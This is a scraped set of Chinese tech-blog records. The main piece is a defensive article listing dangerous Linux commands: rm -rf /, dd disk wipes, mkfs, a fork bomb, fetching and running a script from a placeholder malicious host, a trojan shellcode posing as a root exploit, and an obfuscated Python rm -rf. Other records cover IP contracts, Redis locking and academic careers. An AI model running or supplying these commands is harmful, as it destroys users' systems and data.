亿美元的收购额，足可以要求大量的签订费用。</p>\n<p>所以，每个软件公司都试图拥有员工进行的所有开发。（为防无关的兴趣项目，公司不一定会在行动上强制执行，但在合同上，他们可能会这样操作。）</p>\n<p>顺着这条思路看，软件开发人员通常认为这种情况让人十分沮丧。他们总是幻想着夜晚能够坐在自己房间内，为他们的个人目的在私人电脑上编写属于自己的代码，并拥有其版权和专利。所以，某些州（如加州）的州议员采取了行动进行改进，而其他州（如纽约）则不为所动。改进州的立法机构一般会通过类似这样的法律︰</p>\n<p>所有那些在业余时间、私人设备上进行的、与从事的行业无关的工作，都属于你个人，即使你签订的合同上不承认这点。</p>\n<p>因为这是加州的法律，而这条特殊的条款被纳入了标准无罪合同，而且大部分加州的律师事务所，提供给软件公司客户的合同中也包含了这条，所以全国各地的程序员都可能在合同中看到它，即使他们的所在州不要求这条。</p>\n<p>让我们再仔细地看看条例的内容：</p>\n<blockquote><p><em>On your own time.</em> Easy to determine, I imagine. 在业余时间，这个我想很容易界定。</p>\n<p><em>With your own equipment.</em> Trivial to determine. 在私人设备上，这个不太重要。</p></blockquote>\n<p><strong>与从事的行业无关，请等一下，要如何界定“相关的”或“无关的”？</strong>如果我是谷歌的一名员工，他们是一家涉及广泛的大公司。他们甚至曾经制作了一个酷炫的携带路由器的热气球。热气球与从事的行业相关吗？很显然，搜索引擎、邮件、互联网应用程序和广告是谷歌涉及的领域。这个…</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx2.sinaimg.cn/large/63918611gy1ffdu7mvuooj20lp0g5n13.jpg\" width=\"600\" height=\"446\"></p>\n<p>好吧，如果我的公司是一家为法律行业制作软件的小公司，那么针对会计行业制作的软件是“相关的”吗？</p>\n<p>我不知道。这里的歧义大到你都可以驾驶着卡车穿过去，而这可能取决于法官或陪审团。</p>\n<p>法官（或陪审团）可能在面对巨头谷歌时，会倾向于实力弱小的员工，但谁也说不准，你不能指望这点。</p>\n<p>这种不确定性就足以对那些在业余时间工作的员工创造出寒蝉效应，不管怎么说它都达到了雇主想要的效果，员工不用再担心副项目可能有一天会成为主业，而雇主也很乐于看到这样的情况：昨晚看电视休息的员工，一早精神抖擞地来上班。</p>\n<p>所以，现在来回答这个问题。作为开发人员或法律适用的任何工作，你在美国各地不同公司签署的合同，可能不会有实质性的差异。它们都需要购买你的版权和专利，这样可以免于证明它们是“按时”产生的，所以他们都会尝试购买。除非由于公司的疏忽，没有安排合适的合同到位，在这种情况下，可能是公司本身管理不善，那你又多了一个离职的理由。</p>\n<p>针对管理方面的唯一的区别，就是他们想要执行合同中写明的权利的决心。可能会有以下多种情况：</p>\n<ul>\n<li>我们喜欢副项目。祝你玩得高兴！</li>\n<li>我们确实不喜欢副项目。你应该为我们着想。</li>\n<li>我们喜欢副项目。我们特别喜欢，想要拥有并出售它们！</li>\n<li>我们不是很关心这一点。如果你惹火了我们，我们会想办法让你付出代价。如果你离职后创立了一家竞争性公司，或者是一家半竞争性公司，我们都可以用这份合同让你生不如死。但是，如果你没有冒犯我们并忠诚地为我们服务，当你的苹果 App 获得 $40,000 月利润的时候，我们会找其他的方法奖励你。</li>\n</ul>\n<p>根据和你谈话的对象、特定时段的掌权人以及你是否和老板有肉体关系的不同，都可能产生不同的结果。一般而言，你只能依靠你自己，获得独立性的唯一方法是成为一个独立人。成为一家高科技公司的员工，意味着你已经决定出售你的智力成果，无论结果是好是坏，但你可以自由选择。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111108\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111108votetotal\">3</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111108\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 3 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/zhj318\">飞哥的咖啡</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/zhj318\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2016/09/9667abaa540914200edd449974fb5538.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            我见青山多妩媚，料青山见我应如是        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/zhj318\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/zhj318/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/zhj318/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 17</a> · <a title=\"QQ：574375911\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx2.sinaimg.cn/large/63918611gy1ffdu7fxim7j20sg0lcn1h.jpg"], "fav_nums": 3, "comment_nums": 3, "create_date": "2017/05/08", "praise_nums": 3}
{"tags": "IT技术,Linux", "front_image_path": "full/cd2439bb5e4f786766c3778484778002733566d3.jpg", "title": "千万千万不要运行的 Linux 命令", "url_object_id": "a5f553c54c42584be5ae0cd1c1ffdc93", "url": "http://blog.jobbole.com/110923/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://linux.cn/article-401-1.html\">linux中国</a>   </div><p>文中列出的命令绝对不可以运行，即使你觉得很好奇也不行，除非你是在虚拟机上运行（出现问题你可以还原），因为它们会实实在在的破坏你的系统。所以不在root等高级管理权限下执行命令是很好的习惯。</p>\n<p>早晚有一天，Linux 系统会像 Windows 那样流行，用的人越来越多，包括对计算机不是很了解的人，本文的目的就是告诉大家：在 Linux 给你最大程度自由度的同时，也使得破坏系统变得更加容易，如果你不了解某些命令的意义，下载执行包含恶意命令的脚本，或者被骗运行某些命令，很容易让你哭 都来不及。</p>\n<p>这并不是说明 Linux 不安全，只是说明在不了解 Linux ，和很不小心的人面前，Linux 十分不安全。Windows 也好，Linux 也好，人本身才是最大的不安全因素。</p>\n<p>下面的命令会删除你硬盘上的文件，rm 的 -r 递归删除，和 -f 强制删除是很危险的选项，即使日常操作，也会遇到误删文件的情况。</p>\n<blockquote><p>sudo rm -rf / 删除根分区全部的文件<br>\nsudo rm -rf . 删除当前目录下的所有文件<br>\nsudo rm -rf * 同上<br>\nrm -rf * or rm -rf *.* 同上<br>\nrm -rf ~ / &amp; 删除根分区和家目录，即使你不是root，家目录还是不能幸免。</p></blockquote>\n<p>同样，如果你不知道 mkfs.xxxx (xxxx 可以是 vfat、ext2、ext3、bfs……) 是格式化命令的话，运行下面的命令会擦除你的硬盘分区：</p>\n<blockquote><p>sudo mkfs.xxxx</p></blockquote>\n<p>dd 是强大的 IO 输入输出定向工具，如果使用不当，破坏性很大，不仅仅是当前分区，当前系统，有的时候是整个硬盘。</p>\n<blockquote><p>sudo dd if=/dev/zero of=/dev/sda 全部硬盘清零。<br>\nsudo dd if=/dev/sda of=/dev/sdb 用第一块硬盘的内容覆盖第二块的内容。<br>\nsudo dd if=something of=/dev/sda 往硬盘上写垃圾数据。</p></blockquote>\n<p>同理，直接把命令结果定向到硬盘上，相当于往硬盘上写垃圾数据：</p>\n<blockquote><p>any_command &gt; /dev/sda 用随意的数据破坏硬盘</p></blockquote>\n<p>上面的 sda 、sdb 也可能是其他类似的名称。Linux 的 /dev 系统给操纵硬件提供了很方便和强大的功能，同时也使得破坏变得更容易。</p>\n<p>fork 命令打开一个子进程，如果把 fork 放在无限循环中，最终子进程会耗尽所有内存资源：</p>\n<blockquote><p>:(){:|:&amp;};:</p></blockquote>\n<p>这段不知所云的符号，可以让 Shell 不停的 fork 子进程，最后导致内存耗尽，不得不重启，这不是 bug，只是 Shell 语句故意写成简写的形式而已。下面的同理：</p>\n<blockquote><p>fork while fork</p></blockquote>\n<p>有的时候，压缩包也是一个破坏来源～</p>\n<p>有的压缩包要求你解压到某个系统中已经存在的目录中，这时候你就要特别小心了，压缩包里面可能有成千上万的小文件，以各种文件名尝试覆盖你现有的文件。</p>\n<p>有的压缩包看起来很小，但是解压出来是上 GB 的垃圾数据，会充斥你的硬盘。</p>\n<p>从不正规网站下载的程序、脚本，同样会有包含恶意命令的危险，不可随便执行：</p>\n<blockquote><p>wget [url]http://some_place/some_file[/url]<br>\nsh ./some_file<br>\nwget [url]http://hax018r.org/malicious-script[/url]<br>\nsh ./malicious-script</p></blockquote>\n<p>载脚本要确保来源正规，如果有能力，可以阅读其代码。即使有源代码的程序，也不要随便编译执行：</p>\n<blockquote><p>char esp[] __attribute__ ((section(“.text”))) /* e.s.p<br>\nrelease */<br>\n= “xebx3ex5bx31xc0x50x54x5ax83xecx64x68”<br>\n“xffxffxffxffx68xdfxd0xdfxd9x68x8dx99”<br>\n“xdfx81x68x8dx92xdfxd2x54x5exf7x16xf7”<br>\n“x56x04xf7x56x08xf7x56x0cx83xc4x74x56”<br>\n“x8dx73x08x56x53x54x59xb0x0bxcdx80x31”<br>\n“xc0x40xebxf9xe8xbdxffxffxffx2fx62x69”<br>\n“x6ex2fx73x68x00x2dx63x00”<br>\n“cp -p /bin/sh /tmp/.beyond; chmod 4755<br>\n/tmp/.beyond;”;</p></blockquote>\n<p>上面看起来只是一堆没有意义的 16 进制数据，如果有人告诉你，运行这个程序你就可以不输入密码取得系统的 root 权限，你可不要相信他，上面的程序实际运行的是“rm -rf ~ / &amp; ”。</p>\n<p>python 一类的脚本语言，同样可以拿来搞破坏：</p>\n<blockquote><p>python -c ‘import os; os.system(“”.join([chr(ord(i)-1) for i in “sn!.sg! “]))’</p></blockquote>\n<p>这段程序实际上会执行 rm -rf *，也许你很奇怪上面程序结尾的 “sn!.sg! ” 是什么意思，实际上就是 rm -rf * 每个字母的下一个！</p>\n<h3>那么我们如何避免运行恶意程序呢？</h3>\n<p>第一：不要用 root 作为日常使用的用户，上面的程序，如果当前用户不是 root，危害的波及范围就会小很多。</p>\n<p>第二：要知道哪些命令是干什么用的，不知道的命令不要冒然运行。运行有潜在破坏能力的程序，要小心检查自己的输入。</p>\n<p>第三：要保证软件、脚本的来源正规。</p>\n<p>最后一点，虽然比较消极，但是确实十分重要的一点：</p>\n<p>经常备份你的数据！！</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"110923\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"110923votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"110923\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 7 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2012/04/linux-logo.jpg"], "fav_nums": 7, "comment_nums": 0, "create_date": "2017/04/23", "praise_nums": 1}
{"tags": " 2 评论 ,高并发,分布式,缓存,IT技术", "front_image_path": "full/c09cb16c79404789e48f2eba4301ba131665c0c0.jpg", "title": "一张优惠券引发的血案", "url_object_id": "9a6909f3616c2ea2b9dd982b5cc9605a", "url": "http://blog.jobbole.com/111076/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/bjweimengshu\">玻璃猫</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/d24198d89a821452a421af6ae64b13c4.png\"></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/7def9437ba1d27381bc1d8d522825c3b.jpeg\"></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/66bf1f49392cc2729a0d5cafaaf40cd8.jpeg\"></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/5f0fa047a0e2b67a708e5e89909e012d.jpeg\"></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/fc99049bd070406e907ca7a7b03fc2f8.jpeg\"></p>\n<p>一个月前——</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/09bc3864a82cd1c8f16f1c7edae1ddba.jpeg\"></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/0ae3146a3cb106598ef79fad3f2916dc.jpeg\"></p>\n<p>整个优惠券中心分为前端和后端，小灰所负责的是后端RPC接口的开发。接口中包含“查券”和“领券”两个方法，项目大体结构如下图：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/318ace3b189049e62f11dfba8913af6d.jpeg\"></p>\n<p>两周后——</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/42ad521e5db9f2f628587bcbc4ab82f8.jpeg\"></p>\n<p>小灰：看，这是优惠券查询功能的效果！</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/e1b844b2f74eef1823d3f723c5021e71.jpeg\"></p>\n<p>小灰：看，这是优惠券领取功能的效果！</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/14e01e8b4326eca2c0177263eb083b61.jpeg\"></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/748679d70e308d36cf5e5e442eebd30d.jpeg\"></p>\n<p>三天后——</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/adceb1aa90f1b7893c88bde770ec0c31.jpeg\"></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/b477138a9ffb55307507de5bd8b0ca6e.jpeg\"></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/6bbd3f7bdedfeb0fa43a79e8355351dc.jpeg\"></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/aad1cef68792f2615646d6ecf8e6fc1f.jpeg\"></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/edfb4c04847b5a4005dff11f628e45f1.jpeg\"></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/154b75b87bff4cc056d217702f37d0f2.jpeg\"></p>\n<p>小灰原本的优惠券查询接口是这样实现的：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/fc64391201fe85da923378e79a60335e.jpeg\"></p>\n<p>优惠券列表在Redis中以List的形式存储，查询时的逻辑很简单：</p>\n<p>1.查询缓存，如果缓存存在，返回结果</p>\n<p>2.缓存不存在，查询数据库</p>\n<p>3.把查询数据库的结果循环放入缓存</p>\n<p>然而，当某个时间点缓存不存在，请求量又很大的时候，会出现<strong>缓存并发</strong>的问题。也就是多个线程会重复去查询DB，又重复去更新缓存。（注意，这并不是<strong>缓存击穿</strong>，很多人在这两个概念上混淆。）</p>\n<p>这其中重复查询DB是次要问题，而重复更新缓存则是主要问题。假如有两个线程同时进入上述的第三个阶段，各自进行rpush操作，那么最终会在优惠券列表的缓存中插入两组同样的数据。</p>\n<p>怎么解决呢？用Java的锁机制？显然不行，因为线上环境通常都是多个服务器组成的集群。于是小灰想到了利用<strong>分布式锁</strong>。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/095014b99c5dd133849989833bb76ef5.jpeg\"></p>\n<p>所谓分布式锁有很多种，可以利用ZooKeeper、MemCache、Redis来实现。其中Redis的方式比较简单，无非是利用一个服务器之间共享的Key，以及Setnx指令。</p>\n<p>当第一个线程执行Setnx，会存储对应的键值，相当于成功获得锁。当后续再有线程对同于的Key执行Setnx指令，则会返回空，相当于抢锁失败。同时，为了防止一个线程因意外情况而长久把持着锁，程序对Key设置了1秒的过期时间。</p>\n<p>归纳一下修改后的逻辑：</p>\n<p>1.查询缓存，如果缓存存在，返回结果</p>\n<p>2.缓存不存在，查询数据库</p>\n<p>3.争夺分布式锁</p>\n<p>4.成功获得锁，把查询数据库的结果循环放入缓存</p>\n<p>5.释放分布式锁</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/1beea94a72fb2d15e1c08cc483ef3533.jpeg\"></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/7de5ac624d06a082fba5cae7a3588aa5.jpeg\"></p>\n<p>三天后——</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/79ba27f4cd5680b75005a725a1dcc537.jpeg\"></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/0044500e143abcb925d4533225e64aad.jpeg\"></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/183fd9b545ddc47c5a63b5f9276e280d.jpeg\"></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/1073a937f6afe55bd10f8fd51637707b.jpeg\"></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/72c0b99525b98fdd4667217b04fa3b1c.jpeg\"></p>\n<p>诡异的bug又重现了，因为小灰上次的改动仍然存在一个致命的漏洞。在这里我们假定缓存不存在，刚好有两个线程A和B一后一先进入到代码块。</p>\n<p>第一阶段，线程A刚开始查询优惠券缓存，线程B正尝试获取分布式锁：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/4d7d298409701592f1b7a53adc6d8786.jpeg\"></p>\n<p>第二阶段，由于缓存不存在，线程A开始查询数据库，线程B成功获得锁，开始更新缓存：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/3adf9ed881fad675b2e79d8c49d93be3.jpeg\"></p>\n<p>第三阶段，线程A尝试获得分布式锁，而线程B已经释放分布式锁：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/ab7d96c7be4d6ee33be1876ba8831e2e.jpeg\"></p>\n<p>第四阶段，线程A获得了锁，<strong>又一次</strong>更新缓存，而线程B已经成功返回：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/2d17073f0ce0d166a6a02e3cda641604.jpeg\"></p>\n<p>就这样，缓存被重复更新了两次，所以再次出现数据重复的bug。</p>\n<p>这种局面如何破解呢？其实不难，只需在线程成功得到锁以后，再次判断优惠券缓存的存在：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/71acc87a2e881836880ca644179f2a17.jpeg\"></p>\n<p>归纳一下修改后的逻辑：</p>\n<p>1.查询缓存，如果缓存存在，返回结果</p>\n<p>2.缓存不存在，查询数据库</p>\n<p>3.争夺分布式锁</p>\n<p>4.成功获得锁，再次判断缓存的存在</p>\n<p>5.如果缓存仍旧不存在，把查询数据库的结果循环放入缓存</p>\n<p>6.释放分布式锁</p>\n<p>这种二次判断存在性的机制有一个专门的名字，叫做<strong>双重检测</strong>。该方法在线程安全的单例模式中也常常被用到。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/f9ecbb65155916c904f27a8be9775fcf.jpeg\"></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/dec0265a6c103b90338e8a18c7b5a6af.jpeg\"></p>\n<p>小灰的回忆告一段落——</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/6e05443ad29333f6d6971f625ccb228d.jpeg\"></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/2fdf07d2f2c5816f8eafcaca4c7a5302.jpeg\"></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/2097948c9c34eb94889851fa789aa37b.jpeg\"></p>\n<p><strong>几点补充：</strong></p>\n<p>1.文中所使用的分布式锁，其实并不是“正宗”的分布式锁，当线程争夺锁失败的时候，会直接返回查询DB的结果，而不会依靠<strong>自旋</strong>机制来等锁。</p>\n<p>2.为什么优惠券列表的信息要使用List类型来存入缓存，而不是把整个列表存为一个很长的Json字符串？这是由于业务需要，使用List在某些情况下更方便对单个优惠券信息进行修改（LSET指令）。</p>\n<p>3.为什么优惠券列表的信息不使用Redis的Set或者Hash数据类型来存储，实现自动去重呢？对于Set类型，去重前需要对比整个字符串是否完全相同，而每一张优惠券是一个较长的Json字符串，对比的效率会比较低。使用Hash倒是可以实现高效的去重，但并未在根本上解决重复更新的问题。</p>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我写出更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏作者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我写出更多好文章，谢谢！</h4>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2016/10/2df4a3ede6e684f78858dfde0e7b118f.jpeg\">\n            \n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111076\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111076votetotal\">7</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111076\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/bjweimengshu\">玻璃猫</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/bjweimengshu\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2016/09/7ce4028f2cece3294efcb3e5caa73af1.jpeg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            互联网公司的码农一枚，喜欢算法和面向对象设计。个人微信号：13522239721 个人订阅号：dreamsee321欢迎一起交流讨论！        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/bjweimengshu\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/bjweimengshu/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/bjweimengshu/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 92</a> · <a title=\"个人微信：bjweimengshu\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/7def9437ba1d27381bc1d8d522825c3b.jpeg"], "fav_nums": 3, "comment_nums": 2, "create_date": "2017/05/04", "praise_nums": 7}
{"tags": " 5 评论 ,生活,其他", "front_image_path": "full/6be559ca13bab9c662992cfdc486acd6d42b61a5.jpg", "title": "为何有些牛逼的计算机系教授不去公司赚大钱而是选择教书和做研究", "url_object_id": "eec4c846b0e02d1a516b346ec93852b0", "url": "http://blog.jobbole.com/110958/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/q69039280\">牧师</a> 翻译，<a href=\"http://www.jobbole.com/members/paradise_FD\">郑芸</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://www.quora.com/Why-do-intelligent-professors-like-Ben-Zhao-like-to-teach-and-do-research-when-they-could-make-a-fortune-working-for-private-companies-instead/answer/Ben-Y-Zhao\">Ben Y. Zhao</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>【伯乐在线导读】：有网友在 Quora 上提问：</p>\n<blockquote><p>像赵燕斌这样厉害的教授本可以去私企赚更多的钱，为什么他们喜欢去教学和做研究呢？</p>\n<p>我只是想知道这些教授和研究员们是怎么想的，并不是怀疑他们的选择。</p></blockquote>\n<p>原题主提到的赵燕斌是何许人也？伯乐在线在 2014 年的一篇<a href=\"http://edu.qq.com/a/20141208/025208.htm\" target=\"_blank\">文章</a>找到了这样的介绍：</p>\n<blockquote><p>加州大学圣塔芭芭拉分校（UCSB）的计算机科学学院一直以来都以人才辈出而著称，该学院的年轻华裔副教授赵燕斌，在被MIT《科技评论》提名TR35后，赵燕斌便成为计算机科学界的名人。近年来他是主要活跃在计算机网络信、信息安全及分布式系统领域的知名年轻学者，研究兴趣是构建安全可靠的大规模网络系统方法研究，包括计算机网络算法、协议及应用、移动和无线网络、网络与系统安全问题研究。</p>\n<p>College Factual 的研究数据显示：UCSB 计算机科学专业（本科）毕业生的平均年薪起薪为 68,000美元，在职业生涯中期的薪资大约年薪为 119,000 美元。</p></blockquote>\n<h3>下面是赵燕斌本人于 2016 年 7 月在 Quora 上回答了这个问题（1400+ 顶）</h3>\n<blockquote><p>首先，我不敢相信有这么多人回答这样一个随机的具体问题。感谢每一个在参与答案的朋友。</p>\n<p>做这个决定并不简单。让我试着解释清楚这件事，并权衡它的利弊。</p>\n<p>1.大多数相当成功的学者确实能够选择回到业界，赚的也比在学校更多（有时是非常多）。为什么有人选择了学术生活而不是回归到业界，很大程度上是一个优先级的问题。</p>\n<p>2. 我的许多同事、朋友和导师都选择了回到业界。这些人包括我的同事，比如 Amin Vahdat，来自 UCSD，现在在谷歌的数据网络中心带领团队；Eric Brewer 来自 Berkeley，现在是谷歌基础设施副总裁；我的同学 Matt Welsh 来自哈佛，现在是谷歌手机部门的老大。其他朋友、导师，包括 Steve Gribble 和 David Wetherall，都是从华盛顿大学去到谷歌的，还有 Vivek Pai 是从普林斯顿去到谷歌的。还有好多人，就不一一列举了。</p>\n<p>3. 我已经被谷歌和硅谷以及其他公司的朋友问过许多次了，包括对冲基金甚至律所的朋友都认为我应该进入他们的行业，成为常驻技术专家。而所有这些工作的收入都会比我现在的教职工作高得多，有些则高得多得多。</p>\n<p>4. 与工业界的朋友相比，我每周在工作上的投入时间肯定比业内工程师的平均工作时间还要长，经常周末或晚上还要加班。在工作时长上唯一能与我相比的是律师行业，特别是那些为争取大企业合作伙伴关系而奋斗的律师。我的伯克利法学院（伯特霍尔法学院）朋友工作时长与我相当，但她的收入是我的3倍（去年是5倍多）。总的来说，我在 Google、FB 等公司的朋友，他们的工作生活平衡比一般学者（比如我）要好。 